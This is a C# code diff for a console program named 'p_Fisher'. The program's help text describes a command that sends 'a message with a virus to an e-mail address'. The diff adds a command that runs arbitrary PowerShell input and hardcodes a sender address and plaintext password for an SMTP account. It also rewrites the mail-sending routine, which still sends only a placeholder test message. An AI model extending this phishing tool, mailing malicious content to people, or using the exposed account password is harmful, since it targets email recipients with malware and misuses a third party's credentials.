@@ -7,6 +7,9 @@ using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using System.Threading;
+using System.Net.Http;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement.Tab;
 
 namespace p_Fisher
 {
@@ -60,7 +63,8 @@ namespace p_Fisher
         {
             funkcje f = new funkcje();
 
-            if (output.Contains("change_prompt")) input_chars = output.Replace("change_prompt ", string.Empty);
+            if (output == string.Empty) Console.Write("");
+            else if (output.Contains("change_prompt")) input_chars = output.Replace("change_prompt ", string.Empty);
             else if (output.Contains("change_title")) Console.Title = output.Replace("change_title ", string.Empty);
 
             else if (output == "clear") Console.Clear();
@@ -73,6 +77,25 @@ namespace p_Fisher
             }
 
             else if (output == "show_logo") logo();
+
+            else if (output.Contains("powershell"))
+            {
+                if (output.Contains(" => ") && output.Replace("powershell =>", string.Empty).Replace(" ", string.Empty) != string.Empty)
+                {
+                    output = output.Replace("powershell =>", string.Empty);
+
+                    var processStartInfo = new ProcessStartInfo("powershell.exe", output);
+                    processStartInfo.RedirectStandardOutput = true;
+                    processStartInfo.UseShellExecute = false;
+
+                    var process = new Process();
+                    process.StartInfo = processStartInfo;
+                    process.Start();
+
+                    Console.WriteLine(process.StandardOutput.ReadToEnd());
+                }
+                else { error("There is no command specified\r\n"); f.help("powershell"); }
+            }
 
             else if (output.Contains("change_color"))
             {
@@ -159,10 +182,6 @@ namespace p_Fisher
 
     public class funkcje
     {
-        public static readonly string display_name = "";
-        public static readonly string from_email = "";
-        public static readonly string password = "";
-
         public static string[] e_mail = { "", "" }; //title, body
 
         static readonly Action<string> error = (content) =>
@@ -187,7 +206,7 @@ namespace p_Fisher
                 ///////////
 
                 case "":
-                    Console.WriteLine("\r\nFor more information on a specific command, type help [command-name]\r\n\r\nCommands:\r\n\r\n   change_color       Changes the colors of elements in the console\r\n   change_prompt      Changes the appearance of the prompt\r\n   change_title       Changes the console title\r\n   clear              Cleans the console\r\n   get                Displays the value of a variable\r\n   help               Displays help\r\n   send               Sends a message with a virus to an e-mail address\r\n   set                Sets the value of the variable\r\n   show_logo          Show logo\r\n");
+                    Console.WriteLine("\r\nFor more information on a specific command, type help [command-name]\r\n\r\nCommands:\r\n\r\n   change_color       Changes the colors of elements in the console\r\n   change_prompt      Changes the appearance of the prompt\r\n   change_title       Changes the console title\r\n   clear              Cleans the console\r\n   get                Displays the value of a variable\r\n   help               Displays help\r\n   powershell         Executes the powershell command\r\n   send               Sends a message with a virus to an e-mail address\r\n   set                Sets the value of the variable\r\n   show_logo          Show logo\r\n");
                     break;
 
                 default:
@@ -196,22 +215,57 @@ namespace p_Fisher
                     break;
             }
         }
+        
+        public static readonly string display_name = "pfisher";
+        public static readonly string from_email = "pfisher@onet.eu";
+        public static readonly string password = "JuanPablo2137";
 
         public void send(string email)
         {
-            if(display_name == string.Empty || from_email == string.Empty || password == string.Empty) error("Email, password and display name of the user were not included in the variables!");
+            if (display_name == string.Empty || from_email == string.Empty || password == string.Empty) error("Email, password and display name of the user were not included in the variables!");
             else if (!email.Contains("@") || !email.Contains(".") || email == string.Empty) error("Invalid email adress");
             else
             {
-                SmtpClient smtp = new SmtpClient()
+                try
                 {
-                    Host = "smtp.gmail.com",
+                    SmtpClient client = new SmtpClient //("smtp-mai1.out100k.com");
+                    {
+                        Host = "smtp.poczta.onet.pl",
+                        Port = 465,
+                        DeliveryMethod = SmtpDeliveryMethod.Network,
+                        UseDefaultCredentials = false,
+                        Credentials = new NetworkCredential(from_email, password, "smtp.poczta.onet.pl"),
+                        EnableSsl = true
+                    };
+
+                    MailMessage message = new MailMessage(from_email, email);
+                    message.Subject = "Test Mail";
+
+                    message.Body = "Body\r\nBody2";
+                    client.Send(message);
+
+                    Console.WriteLine("Wyslano wiadomosc");
+                }
+                catch (Exception ex) 
+                {
+                    error(ex.ToString());
+                }
+
+
+
+
+
+                /*SmtpClient smtp = new SmtpClient()
+                {
+                    Host = "smtp-mail.outlook.com",
                     Port = 587,
                     DeliveryMethod = SmtpDeliveryMethod.Network,
                     UseDefaultCredentials = false,
+                    EnableSsl = true,
+
                     Credentials = new NetworkCredential()
                     {
-                        UserName = from_email,
+                        UserName = from_email, //////////
                         Password = password,
                     }
                 };
@@ -224,6 +278,8 @@ namespace p_Fisher
                 };
                 message.To.Add(new MailAddress(email));
 
+                //SmtpMail.SmtpServer=smtpServer;
+
                 try 
                 {
                     smtp.Send(message);
@@ -231,11 +287,10 @@ namespace p_Fisher
                 }
                 catch (Exception ex) 
                 {
-                    error("An error occurred while sending the email. Error: " + ex.InnerException.Message);
-                }
+                    error("An error occurred while sending the email. Error: " + ex.ToString());
+                }*/
             }
         }
-
         public void set(string argument)
         {
             switch(argument)
